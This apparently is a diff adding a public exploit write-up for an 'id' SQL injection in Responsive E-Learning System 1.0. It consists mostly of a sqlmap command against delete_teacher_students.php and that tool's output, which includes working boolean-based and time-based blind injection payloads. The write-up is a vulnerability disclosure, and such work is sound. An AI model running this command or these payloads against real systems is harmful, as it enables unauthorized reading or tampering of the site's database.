@@ -1,0 +1,83 @@
+# Exploit Title: Responsive E-Learning System 1.0 – 'id' Sql Injection
+# Date: 2020-12-24
+# Exploit Author: Kshitiz Raj(manitorpotterk)
+# Vendor Homepage: https://www.sourcecodester.com/php/5172/responsive-e-learning-system.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=5172&title=Responsive+E-Learning+System+using+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested on: Windows 10/Kali Linux
+
+The 'id=' parameter in Responsive E-Learning System is vulnerable to Sql
+Injection.
+
+*Vulnerable Url : *http://localhost/elearning/delete_teacher_students.php?id=17
+-p <http://localhost/elearning/delete_teacher_students.php?id=17%0D-p> id
+
+# sqlmap -u
+http://192.168.127.1//elearning/delete_teacher_students.php?id=17 -p id
+
+        ___
+
+
+__H__
+
+
+ ___ ___["]_____ ___ ___
+{1.3.11#stable}
+
+|_ -| . [.]     | .'| .
+|
+
+|___|_  [']_|_|_|__,|
+_|
+
+      |_|V...       |_|   http://sqlmap.org
+
+
+
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior
+mutual consent is illegal. It is the end user's responsibility to obey all
+applicable local, state and federal laws. Developers assume no liability
+and are not responsible for any misuse or damage caused by this program
+
+
+
+[*] starting @ 08:59:01 /2020-12-24/
+
+
+08:59:33] [INFO] checking if the injection point on GET parameter 'id' is a
+false positive
+
+GET parameter 'id' is vulnerable. Do you want to keep testing the others
+(if any)? [y/N] y
+
+sqlmap identified the following injection point(s) with a total of 402
+HTTP(s) requests:
+
+---
+
+Parameter: id (GET)
+
+    Type: boolean-based blind
+
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or
+GROUP BY clause
+
+    Payload: id=17' RLIKE (SELECT (CASE WHEN (7532=7532) THEN 17 ELSE 0x28
+END))-- YDSn
+
+
+
+    Type: time-based blind
+
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+
+    Payload: id=17' AND (SELECT 4939 FROM (SELECT(SLEEP(5)))EQuU)-- RaGm
+
+---
+
+[08:59:38] [INFO] the back-end DBMS is MySQL
+
+web application technology: PHP 7.2.34, Apache 2.4.46
+
+back-end DBMS: MySQL >= 5.0.12
